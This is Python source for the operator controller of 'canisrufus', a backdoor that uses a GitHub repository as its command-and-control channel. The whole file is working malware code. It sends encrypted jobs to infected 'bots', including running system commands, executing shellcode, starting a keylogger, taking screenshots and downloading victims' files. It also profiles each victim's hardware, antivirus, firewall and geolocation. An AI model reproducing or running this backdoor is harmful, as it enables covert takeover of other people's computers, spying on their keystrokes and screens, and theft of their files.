"""
    This file is part of canisrufus
    Copyright (C) 2017 @maldevel
    https://github.com/maldevel/canisrufus
    
    canisrufus - A fully featured backdoor that uses Github as a C&C server

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    
    For more see the file 'LICENSE' for copying permission.
"""

__author__ = "maldevel"
__copyright__ = "Copyright (c) 2017 @maldevel"
__credits__ = ["maldevel"]
__license__ = "GPLv3"
__version__ = "1.0"
__maintainer__ = "maldevel"

##################################################

import argparse
import sys
import base64
import string
import os
import json
import random
import hashlib
import time

from pygithub3 import Github
from pygithub3.services.repos import Commits
from base64 import b64decode
from argparse import RawTextHelpFormatter
from Crypto.Cipher import AES
from Crypto import Random
from pygithub3 import Github

######################################################


############################################
myrepo = 'my_repository'
username = 'my_username'
access_token = 'my_api_token'
AESKey = 'my_AES_key'
############################################

def generateJobID():
    return hashlib.sha256(''.join(random.sample(string.ascii_letters + string.digits, 30))).hexdigest()

class InfoSecurity:
    
    def __init__(self):
        self.bs = 32
        self.key = hashlib.sha256(AESKey.encode()).digest()
    
    def Encrypt(self, plainText):
        raw = self._pad(plainText)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))
    
    def Decrypt(self, cipherText):
        enc = base64.b64decode(cipherText)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
    
    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    def _unpad(self, s):
        return s[:-ord(s[len(s)-1:])]
    
infoSec = InfoSecurity()


class MessageParser:

    def __init__(self, msg_data):
        self.attachment = None
        self.getPayloads(msg_data)

    def getPayloads(self, msg_data):
        self.dict = json.loads(infoSec.Decrypt(msg_data))

def currentCommit(github):
    ref = github.git_data.references.get('heads/master')
    commit = github.git_data.commits.get(sha=ref.object['sha'])
    return ref.object['sha'], commit.tree['sha']

def createCommit(github, parent_sha, tree, message):
    mycommit = github.git_data.commits.create(
        data={
            'message': message,
            'parents': [parent_sha],
            'tree': tree.sha
        }
    )
    
    github.git_data.references.update(ref='heads/master', data={'sha': mycommit.sha})
    
    return mycommit

def createTree(github, basecommit, blobs):
    tree = []
    
    for blob in blobs:
        tree.append({
            'path': blob.path,
            'type': 'blob',
            'sha': blob.sha,
            'mode': "100644"
        })
    data = {
        'base_tree': basecommit,
        'tree': tree
    }

    tree = github.git_data.trees.create(data)
    
    return tree

def addBlob(github, path, content, encoding="utf-8"):
    
    blob = github.git_data.blobs.create(data={
        'content': content,
        "encoding": encoding
    })
    
    blob.path = path
    
    return blob

class CanisRufus:

    def __init__(self):
        self.gh = Github(token=access_token, user=username, repo=myrepo)

    def commit(self, botid, jobid, cmd, arg='', attachment=[]):

        if (botid is None) or (jobid is None):
            sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")
        
        comment = 'canisrufus:{}:{}'.format(botid, jobid)
        s = str(infoSec.Encrypt(json.dumps({'cmd': cmd, 'arg': arg})))
        
        gh = Github(token=access_token, user=username, repo=myrepo)
        parentSha, baseCommit = currentCommit(gh)
        blobs = []
        blobs.append(addBlob(gh, 'job.{}'.format(jobid), str(s)))
        tree = createTree(gh, baseCommit, blobs)
        createCommit(gh, parentSha, tree, comment)
                
        time.sleep(10)
                
        try:
            for attach in attachment:
                if os.path.exists(attach) == True:
                    file = open(attach, 'rb').read()
                    filedata = base64.b64encode(file)
                    gh = Github(token=access_token, user=username, repo=myrepo)
                    parentSha, baseCommit = currentCommit(gh)
                    blobs = []
                    blobs.append(addBlob(gh, 'file.{}'.format(jobid), str(filedata)))
                    tree = createTree(gh, baseCommit, blobs)
                    comment = 'uploadfile:{}:{}'.format(botid, jobid)
                    createCommit(gh, parentSha, tree, comment)
        except Exception as e:
            pass

        print "[*] Command sent successfully with jobid: {}".format(jobid)

    def checkBots(self):
        bots = []        
        commits=[]
        commits = self.gh.repos.commits.list().all()
        
        for c in commits:
            if 'hereiam:' in c.commit.message:
                comment = c.commit.message
                try:
                    botid = str(comment.split(':')[1])
                    if botid not in bots:
                        bots.append(botid)
                        
                        tree = self.gh.git_data.trees.get('heads/master')
                        for t in tree.tree:
                            if botid == t['path']:
                                blob = self.gh.git_data.blobs.get(t['sha'])
                                msg_data = base64.b64decode(blob.content)
                                msg = MessageParser(msg_data)
                                print botid, msg.dict['os'], c.commit.committer.date
                                break
                
                except ValueError:
                    pass

    def getBotInfo(self, botid):

        if botid is None:
            sys.exit("[-] You must specify a client id (-id)")

        tree = self.gh.git_data.trees.get('heads/master')
        for t in tree.tree:
            if botid == t['path']:
                blob = self.gh.git_data.blobs.get(t['sha'])
                msg_data = base64.b64decode(blob.content)
                msg = MessageParser(msg_data)

                print "ID: " + botid
                print "PID: " + str(msg.dict['pid'])
                print "USER: " + str(msg.dict['user'])
                print "OS: " + str(msg.dict['os'])
                print "ARCHITECTURE: " + str(msg.dict['arch'])
                print "CPU: " + str(msg.dict['cpu'])
                print "GPU: " + str(msg.dict['gpu'])
                print "MOTHERBOARD: " + str(msg.dict['motherboard'])  
                print "CHASSIS TYPE: " + str(msg.dict['chassistype'])
                print "ADMIN: " + str(msg.dict['isAdmin'])
                print "TOTAL RAM: {}GB".format(str(msg.dict['totalram']))
                print "BIOS: " + str(msg.dict['bios'])
                print "MAC ADDRESS: " + str(msg.dict['mac'])
                print "LOCAl IPv4 ADDRESS: " + str(msg.dict['ipv4'])
                print "Antivirus: '{}'".format(msg.dict['av'])
                print "Firewall: '{}'".format(msg.dict['firewall'])
                print "Antispyware: '{}'".format(msg.dict['antispyware'])
                print "TAG: " + str(msg.dict['tag'])
                print "CLIENT VERSION: " + str(msg.dict['version'])
                print "GEOLOCATION: '{}'".format(msg.dict['geolocation'])
                print "FG WINDOWS: '{}'\n".format(msg.dict['fgwindow'])
                
                break
            
            
    def getJobResults(self, botid, jobid):

        if (jobid is None):
            sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")

        commits=[]
        commits = self.gh.repos.commits.list().all()

        for c in commits:
            if 'dmp:{}:{}'.format(botid, jobid) in c.commit.message:
                date = c.commit.committer.date
                    
                comment = 'jobdone.{}'.format(jobid)
                
                tree = self.gh.git_data.trees.get('heads/master')
                for t in tree.tree:
                    if 'jobdone.{}'.format(jobid) == t['path']:
                        blob = self.gh.git_data.blobs.get(t['sha'])
                        msg_data = base64.b64decode(blob.content)
                        msg = MessageParser(msg_data)
                        
                    if 'file.{}'.format(jobid) in t['path']:
                        blob = self.gh.git_data.blobs.get(t['sha'])
                        filedata = base64.b64decode(blob.content)
                
                print "DATE: '{}'".format(date)
                print "JOBID: " + jobid
                print "FG WINDOWS: '{}'".format(msg.dict['fgwindow'])
                print "CMD: '{}'".format(msg.dict['msg']['cmd'])
                print ''
                print "'{}'\n".format(msg.dict['msg']['res'])

                if msg.dict['msg']['cmd'] == 'screenshot':
                    imgname = '{}-{}.png'.format(botid, jobid)
                    with open("./data/" + imgname, 'wb') as image:
                        image.write(base64.b64decode(filedata))
                        image.close()

                    print "[*] Screenshot saved to ./data/" + imgname

                elif msg.dict['msg']['cmd'] == 'download':
                    filename = "{}-{}".format(botid, jobid)
                    with open("./data/" + filename, 'wb') as dfile:
                        dfile.write(b64decode(filedata))
                        dfile.close()

                    print "[*] Downloaded file saved to ./data/" + filename


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="""      
    
    
 _____             _     ______       __           
/  __ \           (_)    | ___ \     / _|          
| /  \/ __ _ _ __  _ ___ | |_/ /   _| |_ _   _ ___ 
| |    / _` | '_ \| / __||    / | | |  _| | | / __|
| \__/\ (_| | | | | \__ \| |\ \ |_| | | | |_| \__ \\
 \____/\__,_|_| |_|_|___/\_| \_\__,_|_|  \__,_|___/
                                                   
                                                   
      

""",                                 
                                     version='1.0.0',
                                     formatter_class=RawTextHelpFormatter)
    
    parser.add_argument("-id", dest='id', type=str, default=None, help="Client to target")
    parser.add_argument('-jobid', dest='jobid', default=None, type=str, help='Job id to retrieve')

    agroup = parser.add_argument_group()
    blogopts = agroup.add_mutually_exclusive_group()
    blogopts.add_argument("-list", dest="list", action="store_true", help="List available clients")
    blogopts.add_argument("-info", dest='info', action='store_true', help='Retrieve info on specified client')

    sgroup = parser.add_argument_group("Commands", "Commands to execute on a client")
    slogopts = sgroup.add_mutually_exclusive_group()
    slogopts.add_argument("-cmd", metavar='CMD', dest='cmd', type=str, help='Execute a system command')
    slogopts.add_argument("-visitwebsite", metavar='URL', dest='visitwebsite', type=str, help='Visit website')
    slogopts.add_argument("-message", metavar=('TEXT', 'TITLE'), nargs=2, type=str, help='Show message to user')
    slogopts.add_argument("-tasks", dest='tasks', action='store_true', help='Retrieve running processes')
    slogopts.add_argument("-services", dest='services', action='store_true', help='Retrieve system services')
    slogopts.add_argument("-users", dest='users', action='store_true', help='Retrieve system users')
    slogopts.add_argument("-devices", dest='devices', action='store_true', help='Retrieve devices(Hardware)')
    slogopts.add_argument("-download", metavar='PATH', dest='download', type=str, help='Download a file from a clients system')
    slogopts.add_argument("-download-fromurl", metavar='URL', dest='fromurl', type=str, help='Download a file from the web')
    slogopts.add_argument("-upload", nargs=2, metavar=('SRC', 'DST'), help="Upload a file to the clients system")
    slogopts.add_argument("-exec-shellcode", metavar='FILE',type=argparse.FileType('rb'), dest='shellcode', help='Execute supplied shellcode on a client')
    slogopts.add_argument("-screenshot", dest='screen', action='store_true', help='Take a screenshot')
    slogopts.add_argument("-lock-screen", dest='lockscreen', action='store_true', help='Lock the clients screen')
    slogopts.add_argument("-shutdown", dest='shutdown', action='store_true', help='Shutdown remote computer')
    slogopts.add_argument("-restart", dest='restart', action='store_true', help='Restart remote computer')
    slogopts.add_argument("-logoff", dest='logoff', action='store_true', help='Log off current remote user')
    slogopts.add_argument("-force-checkin", dest='forcecheckin', action='store_true', help='Force a check in')
    slogopts.add_argument("-start-keylogger", dest='keylogger', action='store_true', help='Start keylogger')
    slogopts.add_argument("-stop-keylogger", dest='stopkeylogger', action='store_true', help='Stop keylogger')
    slogopts.add_argument("-git-checkin",type=int, metavar='CHECK', dest='git_check', help='Seconds to wait before checking for new commands')
    slogopts.add_argument("-jitter", metavar='jit',type=int, dest='jitter', help='Percentage of Jitter')
    
    if len(sys.argv) is 1:
        parser.print_help()
        sys.exit()

    args = parser.parse_args()
    
    canisrufus = CanisRufus()
    jobid = generateJobID()

    if args.list:
        canisrufus.checkBots()

    elif args.info:
        canisrufus.getBotInfo(args.id)

    elif args.cmd:
        canisrufus.commit(args.id, jobid, 'cmd', args.cmd)

    elif args.visitwebsite:
        canisrufus.commit(args.id, jobid, 'visitwebsite', args.visitwebsite)
        
    elif args.message:
        canisrufus.commit(args.id, jobid, 'message', args.message)
        
    elif args.tasks:
        canisrufus.commit(args.id, jobid, 'tasks')
    
    elif args.services:
        canisrufus.commit(args.id, jobid, 'services')
        
    elif args.users:
        canisrufus.commit(args.id, jobid, 'users')
        
    elif args.devices:
        canisrufus.commit(args.id, jobid, 'devices')
        
    elif args.shellcode:
        canisrufus.commit(args.id, jobid, 'execshellcode', args.shellcode.read().strip())

    elif args.download:
        canisrufus.commit(args.id, jobid, 'download', r'{}'.format(args.download))

    elif args.fromurl:
        canisrufus.commit(args.id, jobid, 'downloadfromurl', r'{}'.format(args.fromurl))
        
    elif args.upload:
        canisrufus.commit(args.id, jobid, 'upload', r'{}'.format(args.upload[1]), [args.upload[0]])

    elif args.screen:
        canisrufus.commit(args.id, jobid, 'screenshot')

    elif args.lockscreen:
        canisrufus.commit(args.id, jobid, 'lockscreen')

    elif args.shutdown:
        canisrufus.commit(args.id, jobid, 'shutdown')
        
    elif args.restart:
        canisrufus.commit(args.id, jobid, 'restart')
        
    elif args.logoff:
        canisrufus.commit(args.id, jobid, 'logoff')
        
    elif args.forcecheckin:
        canisrufus.commit(args.id, jobid, 'forcecheckin')

    elif args.keylogger:
        canisrufus.commit(args.id, jobid, 'startkeylogger')

    elif args.stopkeylogger:
        canisrufus.commit(args.id, jobid, 'stopkeylogger')

    elif args.git_check:
        canisrufus.commit(args.id, jobid, 'git_check', args.git_check)

    elif args.jitter:
        canisrufus.commit(args.id, jobid, 'jitter', args.jitter)

    elif args.jobid:
        canisrufus.getJobResults(args.id, args.jobid)
                
